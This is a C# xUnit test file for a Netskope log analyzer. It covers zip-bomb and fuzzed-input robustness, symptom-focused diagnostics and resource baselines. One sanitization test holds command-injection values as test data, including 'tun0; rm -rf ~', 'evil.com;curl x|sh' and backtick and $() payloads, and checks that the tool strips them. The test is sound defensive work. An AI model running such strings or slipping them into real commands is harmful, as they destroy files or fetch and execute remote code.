using System.IO.Compression;
using System.Text;
using NetskopeLogAnalyzer.Core;
using Xunit;

namespace NetskopeLogAnalyzer.Tests;

/// <summary>v4: segurança da entrada (pentest), análise por sintoma e baseline de recursos.</summary>
public class V4Tests
{
    private static byte[] Zip(params (string Name, byte[] Data)[] files)
    {
        var ms = new MemoryStream();
        using (var z = new ZipArchive(ms, ZipArchiveMode.Create, true))
            foreach (var (name, data) in files)
            {
                var e = z.CreateEntry(name, CompressionLevel.Optimal);
                using var s = e.Open();
                s.Write(data);
            }
        return ms.ToArray();
    }

    private static readonly byte[] SmallLog = Encoding.UTF8.GetBytes(
        "2026/11/23 10:00:00.100000 stAgentSvc p1 t1 info main.cpp:1 main ======= stAgentSvc 142.0.0.2821 starting ======\n" +
        "2026/11/23 10:00:05.100000 stAgentSvc p1 t1 error nsHTTPClient.cpp:1 downloader curl_easy_perform failed, code 28, error Timeout was reached\n");

    // ------------------------------------------------------------------ pentest: entrada maliciosa

    [Fact]
    public void ZipBomb_IsSkipped()
    {
        var bomb = Zip(("nsdebuglog.log", SmallLog), ("bomb.log", new byte[60 * 1024 * 1024]));
        var items = new List<SourceItem>(); var skipped = new List<string>();
        Analyzer.ExtractZip(bomb, "", items, skipped);
        Assert.Contains(items, i => i.Name == "nsdebuglog.log");
        Assert.DoesNotContain(items, i => i.Name == "bomb.log");
        Assert.Contains(skipped, s => s.Contains("zip bomb", StringComparison.Ordinal));
    }

    [Fact]
    public void NestedZips_AreLimitedInDepth()
    {
        var z = Zip(("nsdebuglog.log", SmallLog));
        for (var i = 0; i < 6; i++) z = Zip(($"nivel{i}.zip", z));
        var items = new List<SourceItem>(); var skipped = new List<string>();
        Analyzer.ExtractZip(z, "", items, skipped);
        Assert.Empty(items);
        Assert.Contains(skipped, s => s.Contains("profundidade", StringComparison.Ordinal));
    }

    [Fact]
    public void CorruptZip_DoesNotThrow()
    {
        var z = Zip(("nsdebuglog.log", SmallLog));
        for (var i = 40; i < z.Length; i += 7) z[i] ^= 0x5A;
        var items = new List<SourceItem>(); var skipped = new List<string>();
        var ex = Record.Exception(() => Analyzer.ExtractZip(z, "", items, skipped));
        Assert.Null(ex);
    }

    [Fact]
    public void GarbageAndHugeLines_DoNotBreakAnalysis()
    {
        var rnd = new Random(42);
        var garbage = new byte[300_000]; rnd.NextBytes(garbage);
        var huge = "2026/11/23 10:00:01.100000 stAgentSvc p1 t1 error x.cpp:1 " + new string('a', 200_000) + "\n";
        var nested = "[" + new string('[', 50_000) + "\n";
        var r = new Analyzer().AnalyzeItems(new[]
        {
            new SourceItem("nsdebuglog.log", SmallLog.Concat(Encoding.UTF8.GetBytes(huge + nested)).ToArray()),
            new SourceItem("npadebuglog.log", garbage),
            new SourceItem("network-state.log", garbage),
            new SourceItem("nsconfig.json", Encoding.UTF8.GetBytes("{\"clientConfig\": [1,2,{\"a\":")),
        });
        Assert.True(r.Entries.Count >= 2);
        Assert.All(r.Entries, e => Assert.True(e.Line.Length <= 16384));
    }

    [Fact]
    public void Pcap_FuzzedInput_NeverThrows()
    {
        var rnd = new Random(7);
        for (var round = 0; round < 200; round++)
        {
            var d = new byte[rnd.Next(24, 4000)];
            rnd.NextBytes(d);
            // cabeçalho válido em metade dos casos para exercitar o parser de pacotes
            if (round % 2 == 0) { BitConverter.GetBytes(0xa1b2c3d4u).CopyTo(d, 0); BitConverter.GetBytes(round % 3 == 0 ? 1u : 101u).CopyTo(d, 20); }
            if (round % 5 == 0) BitConverter.GetBytes(0x0A0D0D0Au).CopyTo(d, 0);
            var ex = Record.Exception(() => PcapReader.Read("fuzz.pcap", d));
            Assert.Null(ex);
        }
    }

    [Fact]
    public void Commands_NeverCarryUntrustedLogText()
    {
        Assert.Equal("<interface>", SafeText.Token("fctvpn$(reboot)", "<interface>"));
        Assert.Equal("<interface>", SafeText.Token("tun0; rm -rf ~", "<interface>"));
        Assert.Equal("fctvpn1077f7c3", SafeText.Token("fctvpn1077f7c3", "<interface>"));
        Assert.Equal("<h>", SafeText.Host("evil.com;curl x|sh", "<h>"));
        Assert.Equal("163.116.224.49", SafeText.Host("163.116.224.49", "<h>"));
        var f = new Finding { Key = "orphan", Severity = Severity.Warning, Category = "Rede", Title = "t", Meaning = "m", Action = "a" };
        f.Interfaces.Add("fctvpn`id`");
        f.Interfaces.Add("fctvpnok1");
        var steps = KnowledgeBase.BuildSteps(f, ClientOs.Linux, "acme; reboot");
        var all = string.Join("\n", steps.Select(s => s.Command ?? ""));
        Assert.DoesNotContain("`id`", all, StringComparison.Ordinal);
        Assert.DoesNotContain("reboot", all, StringComparison.Ordinal);
        Assert.Contains("fctvpnok1", all, StringComparison.Ordinal);
        Assert.Equal("a b", SafeText.Printable("a‮b").Replace("  ", " "));
    }

    // ------------------------------------------------------------------ análise por sintoma

    private static string Npa(DateTime t, string level, string msg) => $"[PC01:{t:yyyy-MM-dd HH:mm:ss.fff} -03:00] t1 [{level}] f.cpp:1:f():0x0 {msg}";
    private static string Svc(DateTime t, string level, string msg) => $"{t:yyyy/MM/dd HH:mm:ss}.100000 stAgentSvc p1 t1 {level} f.cpp:1 {msg}";
    private static readonly DateTime T0 = new(2026, 11, 23, 8, 0, 0);

    private static AnalysisResult FocusRun(AnalysisOptions o)
    {
        var npa = new StringBuilder();
        npa.AppendLine(Npa(T0, "info", "Starting handler with GW gateway.npa.goskope.com (163.116.224.49:443, pop:BR-SAO1, type:GSLB, newIp:1)."));
        npa.AppendLine(Npa(T0.AddSeconds(1), "info", "TLS client established connection TLS version:TLSv1.2 server:163.116.224.49:443 cipher:X"));
        for (var i = 1; i <= 8; i++) npa.AppendLine(Npa(T0.AddMinutes(5 * i), "info", $"NPAGW 163.116.224.49: RETRANS:{10 + i}, RTT:12ms, HIST:(0)."));
        npa.AppendLine(Npa(T0.AddMinutes(41), "error", "keepAlive fails with 15 tries."));
        npa.AppendLine(Npa(T0.AddMinutes(41), "info", "NPA Tunnel is disconnected."));
        npa.AppendLine(Npa(T0.AddMinutes(45), "info", "NPA Client is connecting to Primary Tenant."));
        npa.AppendLine(Npa(T0.AddMinutes(45).AddSeconds(2), "info", "TLS client established connection TLS version:TLSv1.2 server:163.116.224.49:443 cipher:X"));
        npa.AppendLine(Npa(T0.AddMinutes(60), "info", "Set NPA log level to 2"));
        var svc = new StringBuilder();
        svc.AppendLine(Svc(T0, "info", "main ======= stAgentSvc 142.0.0.2821 starting ======"));
        for (var i = 0; i < 6; i++) svc.AppendLine(Svc(T0.AddMinutes(2 * i), "info", $"nsTunnel TLS Tunneling flow from addr: 100.65.0.2:5000, process: ms-teams to host: teams.microsoft.com, addr: 52.1.1.1:443 to nsProxy"));
        svc.AppendLine(Svc(T0.AddMinutes(13), "info", "BypassAppMgr bypassing flow to exception host: api.zoom.us, process: zoom, Dest IP: 1.2.3.4, Dest Port: 443, Src IP: 10.0.0.2"));
        for (var i = 0; i < 4; i++) svc.AppendLine(Svc(T0.AddMinutes(40).AddSeconds(10 * i), "warn", "downloader curl_easy_perform failed, code 28, error Timeout was reached"));
        svc.AppendLine(Svc(T0.AddMinutes(60), "info", "nsAgentSvc ======= Log collection complete ======="));
        const string exc = """{"Off Prem":{"names":["*.zoom.us","bitdefender.com"],"ips":[]}}""";
        var a = new Analyzer { Options = o };
        return a.AnalyzeItems(new[]
        {
            new SourceItem("npadebuglog.log", Encoding.UTF8.GetBytes(npa.ToString())),
            new SourceItem("nsdebuglog.log", Encoding.UTF8.GetBytes(svc.ToString())),
            new SourceItem("nsexception.json", Encoding.UTF8.GetBytes(exc)),
        });
    }

    [Fact]
    public void Focus_RunsChecksPerSymptomAndTagsFindings()
    {
        var o = new AnalysisOptions { Domain = "https://Teams.Microsoft.com/v2", ProblemTime = T0.AddMinutes(42) };
        o.Domain = FocusAnalyzer.NormalizeDomain(o.Domain!);
        foreach (var s in new[] { "npa", "lentidao", "url" }) o.Symptoms.Add(s);
        var r = FocusRun(o);
        Assert.Equal(3, r.Focus.Count);
        var npa = r.Focus.Single(f => f.Symptom.Id == "npa");
        Assert.Equal("Problema encontrado", npa.Verdict);
        Assert.Contains(npa.Checks, c => c.Name.StartsWith("Quedas do túnel", StringComparison.Ordinal) && c.Status != "ok");
        Assert.Contains(npa.Checks, c => c.Name.StartsWith("Horário informado", StringComparison.Ordinal) && c.Status != "ok");
        Assert.Contains(r.Incidents, i => i.InFocusWindow);
        Assert.Contains(r.Findings, f => f.Key == "npadrops" && f.FocusTags.Contains("Private Access"));
        Assert.Equal("teams.microsoft.com", r.Domain!.Domain);
        Assert.Equal(6, r.Domain.Tunneled);
        Assert.Equal(6, r.Domain.Processes["ms-teams"]);
        var url = r.Focus.Single(f => f.Symptom.Id == "url");
        Assert.Contains(url.Checks, c => c.Name == "Site teams.microsoft.com" && c.Detail.Contains("tunelada", StringComparison.Ordinal));
        Assert.Contains("## Foco da análise", Report.ToMarkdown(r), StringComparison.Ordinal);
    }

    [Fact]
    public void Focus_DomainInExceptions_AndRerunClearsTags()
    {
        var o = new AnalysisOptions { Domain = "api.zoom.us" };
        o.Symptoms.Add("app");
        var r = FocusRun(o);
        Assert.Contains("Off Prem: *.zoom.us", r.Domain!.Exceptions);
        Assert.Equal(1, r.Domain.Bypassed);
        // reaplicar sem sintomas limpa o foco
        FocusAnalyzer.Run(r, new AnalysisOptions());
        Assert.Empty(r.Focus);
        Assert.All(r.Findings, f => Assert.Empty(f.FocusTags));
        Assert.True(FocusAnalyzer.PatternMatches("*.zoom.us", "zoom.us"));
        Assert.False(FocusAnalyzer.PatternMatches("zoom.us", "evilzoom.us"));
        Assert.True(FocusAnalyzer.PatternMatches("mp.microsoft.com", "a.mp.microsoft.com"));
    }

    [Fact]
    public void Focus_TimeOutsideLogs_IsReported()
    {
        var o = new AnalysisOptions { ProblemTime = T0.AddDays(-3) };
        o.Symptoms.Add("semnav");
        var r = FocusRun(o);
        Assert.Contains(r.Focus[0].Checks, c => c.Name.StartsWith("Horário informado", StringComparison.Ordinal) && c.Status == "sem dados");
    }

    // ------------------------------------------------------------------ baseline de recursos

    [Fact]
    public void Resources_FromPsSnapshot()
    {
        Assert.Equal(165 * 60 + 6, SnapshotParsers.CpuTime("165:06"));
        Assert.Equal(86400 + 3600 + 60 + 1, SnapshotParsers.CpuTime("1-01:01:01"));
        var ps = new StringBuilder();
        ps.AppendLine("$ /usr/bin/ps aux");
        ps.AppendLine("USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND");
        ps.AppendLine("root           1  0.5  0.1  24996 15780 ?        Ss   08:00   1:58 /sbin/init splash");
        for (var i = 0; i < 4; i++) ps.AppendLine($"root          1{i}  0.0  0.0      0     0 ?        S    08:00   0:00 [migration/{i}]");
        ps.AppendLine("root         100 80.0 20.0 100000 1677721 ?       Sl   08:00 720:00 falcon-sensor-bpf");
        ps.AppendLine("user         200 10.0 40.0 100000 3355443 ?       Sl   08:00  36:00 /opt/google/chrome/chrome");
        ps.AppendLine("root         300  2.0  1.0 100000 83886 ?         Ssl  08:00   7:00 /opt/netskope/stagent/stAgentSvc");
        var svc = Svc(T0, "info", "main ======= stAgentSvc 142.0.0.2821 starting ======") + "\n" + Svc(T0.AddHours(6), "info", "nsAgentSvc ======= Log collection complete =======") + "\n";
        var r = new Analyzer().AnalyzeItems(new[]
        {
            new SourceItem("nsdebuglog.log", Encoding.UTF8.GetBytes(svc + svc.Replace("08:00:00", "09:00:00"))),
            new SourceItem("network-state.log", Encoding.UTF8.GetBytes(ps.ToString())),
        });
        var res = r.Performance.Where(p => p.Group == TacInsights.ResourceGroup).ToList();
        Assert.Contains(res, p => p.Name == "Núcleos de CPU (lógicos)" && p.Value == "4");
        var avg = Assert.Single(res, p => p.Name == "CPU média desde o boot (máquina toda)");
        Assert.NotEqual("bom", avg.Status); // (≈765 min de CPU) / (6 h × 4 núcleos) ≈ 53%
        Assert.Contains(res, p => p.Name == "Quem mais usou CPU desde o boot" && p.Value.StartsWith("falcon-sensor-bpf", StringComparison.Ordinal));
        Assert.Contains(res, p => p.Name == "Memória total" && p.Value.StartsWith("8", StringComparison.Ordinal));
        Assert.Contains(r.Findings, f => f.Key == "resources");
    }
}
